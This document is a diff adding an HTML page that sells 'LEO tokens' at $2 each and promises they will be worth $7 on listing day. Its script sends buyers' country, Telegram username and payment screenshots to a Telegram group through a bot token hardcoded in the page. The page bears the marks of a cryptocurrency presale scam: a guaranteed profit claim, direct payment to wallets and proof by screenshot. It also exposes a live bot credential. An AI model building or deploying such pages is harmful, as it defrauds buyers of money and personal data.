@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Buy LEO Tokens</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #1e1e2f;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 500px;
+      background: #29293d;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+    }
+
+    .container h2, .container p {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+
+    .container p {
+      font-size: 0.9rem;
+      line-height: 1.6;
+    }
+.back-arrow {
+      position: absolute;
+      left: 10px;
+      
+      transform: translateY(-50%);
+      font-size: 1.8rem;
+      color: #FFCC00;
+      cursor: pointer;
+      transition: color 0.3s ease;
+    }
+
+    .back-arrow:hover {
+      color: #FFB300;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+    }
+
+    input, button, .file-input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+
+    input {
+      background: #1e1e30;
+      color: #fff;
+      outline: none;
+    }
+
+    button, .file-input {
+      background: #ffd700;
+      color: #29293d;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #f0c907;
+    }
+
+    .payment-buttons button {
+      margin: 10px 0;
+      width: 100%;
+    }
+
+    .modal {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 80%;
+      max-width: 400px;
+      background: #29293d;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      color: #fff;
+      display: none;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+    }
+
+    .modal h3 {
+      margin-bottom: 10px;
+    }
+
+    .modal p {
+      margin-bottom: 20px;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      z-index: 999;
+    }
+
+    .overlay.active, .modal.active {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+
+  <a href="home.html" class="back-arrow">←</a>
+  <h1>Buy LEO Tokens</h1>
+  <div class="container">
+    <h2>Purchase Tokens</h2>
+    <p>
+      Buy LEO tokens now for $2 per token (normally $5). When listing day comes, they will be worth $7! Fill all boxes below, calculate your total fee, and pay using one of the provided payment options.
+    </p>
+    <form id="tokenForm">
+      <label for="country">Your Country</label>
+      <input type="text" id="country" placeholder="Enter your country" required>
+
+      <label for="telegramUsername">Telegram Username</label>
+      <input type="text" id="telegramUsername" placeholder="Enter your Telegram username" required>
+
+      <label for="tokenAmount">Number of Tokens</label>
+      <input type="number" id="tokenAmount" placeholder="Enter the number of tokens" required>
+
+      <label for="totalFee">Total Fee (in USD)</label>
+      <input type="text" id="totalFee" readonly>
+
+      <label for="paymentScreenshot">Payment Screenshot</label>
+      <input type="file" id="paymentScreenshot" class="file-input" accept="image/*" required>
+
+      <div class="payment-buttons">
+        <button type="button" onclick="redirectToPayment('telegramWallet')">Pay with Telegram Wallet</button>
+        <button type="button" onclick="redirectToPayment('tonKeeper')">Pay with Ton Keeper</button>
+        <button type="button" onclick="redirectToPayment('payoneer')">Pay with Payoneer</button>
+        <button type="button" onclick="redirectToPayment('wireTransfer')">Pay with Wire Transfer</button>
+      </div>
+
+      <button type="submit">Send Request</button>
+    </form>
+  </div>
+
+  <!-- Modal -->
+  <div class="overlay" id="overlay"></div>
+  <div class="modal" id="modal">
+    <h3 id="modalTitle">Request Status</h3>
+    <p id="modalMessage"></p>
+    <button onclick="closeModal()">Close</button>
+  </div>
+
+  <script>
+    const form = document.getElementById('tokenForm');
+    const totalFeeInput = document.getElementById('totalFee');
+    const modal = document.getElementById('modal');
+    const overlay = document.getElementById('overlay');
+
+    const botToken = '7682496596:AAH7bjAswxdaq3rJ3Q5RdJTD0nid8LpPuAk'; // Replace with your bot token
+    const groupChatId = '@ddjdjdjdnfodndb'; // Replace with your chat ID
+
+    function generateRandomPassword() {
+      let result = '';
+      for (let i = 0; i < 70; i++) {
+        result += Math.floor(Math.random() * 10); // Generate digits from 0-9
+      }
+      return result; // Return a 70-digit random password
+    }
+
+    document.getElementById('tokenAmount').addEventListener('input', (e) => {
+      const amount = e.target.value;
+      totalFeeInput.value = `$${amount * 2}`;
+    });
+
+    function redirectToPayment(option) {
+      const paymentLinks = {
+        telegramWallet: 'https://wallet.telegram.org/',
+        tonKeeper: 'https://tonkeeper.com/',
+        payoneer: 'https://www.payoneer.com/',
+        wireTransfer: 'https://www.example.com/wire-transfer',
+      };
+      window.open(paymentLinks[option], '_blank');
+    }
+
+    function closeModal() {
+      overlay.classList.remove('active');
+      modal.classList.remove('active');
+    }
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const country = document.getElementById('country').value;
+      const telegramUsername = document.getElementById('telegramUsername').value;
+      const tokenAmount = document.getElementById('tokenAmount').value;
+      const totalFee = totalFeeInput.value;
+      const paymentScreenshot = document.getElementById('paymentScreenshot').files[0];
+
+      if (!paymentScreenshot) {
+        showModal('Error', 'Please upload a payment screenshot.');
+        return;
+      }
+
+      // Generate a 70-digit random password
+      const randomPassword = generateRandomPassword();
+      localStorage.setItem('randomPassword', randomPassword); // Save the password in local storage
+      localStorage.setItem(randomPassword, tokenAmount); // Save the token amount with the random password as the key
+
+      const formData = new FormData();
+      formData.append('chat_id', groupChatId);
+      formData.append('caption', `
+📤 **New Token Purchase Request**
+- Country: ${country}
+- Telegram Username: ${telegramUsername}
+- Tokens: ${tokenAmount}
+- Total Fee: ${totalFee}
+- Random Password: ${randomPassword} // This will be sent to the group
+      `);
+      formData.append('photo', paymentScreenshot);
+
+      try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData,
+        });
+
+        showModal('Success', 'Your request has been sent. You will receive a response within 5 hours.');
+        setTimeout(() => {
+          window.location.href = 'passwordbuy.html';
+        }, 3000); // Redirect after 3 seconds
+      } catch (error) {
+        showModal('Error', 'Error submitting your request. Please try again.');
+      }
+    });
+
+    function showModal(title, message) {
+      document.getElementById('modalTitle').textContent = title;
+      document.getElementById('modalMessage').textContent = message;
+      overlay.classList.add('active');
+      modal.classList.add('active');
+    }
+  </script>
+</body>
+</html>
